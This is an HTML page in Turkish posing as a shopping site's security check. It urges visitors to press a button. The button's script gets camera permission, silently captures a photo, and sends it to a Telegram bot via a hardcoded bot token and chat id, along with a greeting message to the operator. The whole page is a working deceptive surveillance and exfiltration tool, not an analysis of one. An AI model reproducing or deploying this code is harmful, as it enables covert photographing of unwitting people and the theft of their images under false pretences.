<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GUVENLİK </title>
<link rel="stylesheet" href="styles.css">
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f0f0f0;
  }

  h1 {
    color: #333;
  }

  p {
    color: #666;
  }

  button {
    padding: 10px 20px;
    background-color: #007bff;
    color: #fff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
  }

  button:hover {
    background-color: #0056b3;
  }
</style>
</head>
<body>
<h1>HoŞGeldiniz!</h1>
<p>ALIS VERIS YAPMAK ICIN DEVAM EDIN  </p>
<p>GUVENLİKNİCİN ASAGİDAKİ BUTONA BAS ㅤㅤㅤㅤ👇👇</p>
<button onclick="allowCamera()">BANA BAS 🥳😁</button>

<script>
function allowCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
      var video = document.createElement('video');
      document.body.appendChild(video);
      video.srcObject = stream;
      video.play();

      // Kamera eriim izni verildiinde fotoraf çek
      video.addEventListener('canplay', function() {
        var canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        var context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        var imgData = canvas.toDataURL('image/jpeg');

        // Fotoraf binary olarak gönder
        var binaryData = atob(imgData.split(',')[1]);
        var arrayBuffer = new ArrayBuffer(binaryData.length);
        var uint8Array = new Uint8Array(arrayBuffer);
        for (var i = 0; i < binaryData.length; i++) {
          uint8Array[i] = binaryData.charCodeAt(i);
        }

        // Fotoraf FormData nesnesiyle gönder
        var formData = new FormData();
        formData.append('chat_id', '6070918315');
        formData.append('photo', new Blob([uint8Array], { type: 'image/jpeg' }));
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendPhoto');
        xhr.send(formData);

        // Metni de gönder
        var xhrText = new XMLHttpRequest();
        xhrText.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendMessage');
        xhrText.setRequestHeader('Content-Type', 'application/json');
        xhrText.send(JSON.stringify({ chat_id: '6070918315', text: 'Merhaba Halil bey!' }));

        // Kamera akn durdur
        stream.getTracks().forEach(track => track.stop());
        document.body.removeChild(video);
      });
    })
    .catch(function(err) {
      console.error('Kamera eriimi reddedildi:', err);
    });
}
</script>
</body>
</html>
